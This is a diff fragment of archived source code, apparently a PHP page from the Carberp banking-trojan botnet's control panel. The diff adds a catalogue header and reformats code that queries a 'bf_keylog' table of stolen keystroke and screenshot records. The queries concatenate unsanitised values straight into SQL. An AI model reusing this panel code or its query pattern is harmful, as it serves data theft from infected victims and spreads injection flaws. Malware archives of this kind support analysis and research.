@@ -1,8 +1,21 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT * from bf_keylog WHERE id = '.$Cur['id'].' LIMIT 1');
+if(!empty($Cur['id'])){
+	$item = $mysqli->query('SELECT * from bf_keylog WHERE id = '.$Cur['id'].' LIMIT 1');
 
-	if($item->id == $Cur['id']){		/*
+	if($item->id == $Cur['id']){
+		/*
 		$files = $mysqli->query('SELECT screen FROM bf_keylog_data WHERE (hash = \''.$item->hash.'\')', null, null, false);
 
 		if(count($files) > 0){
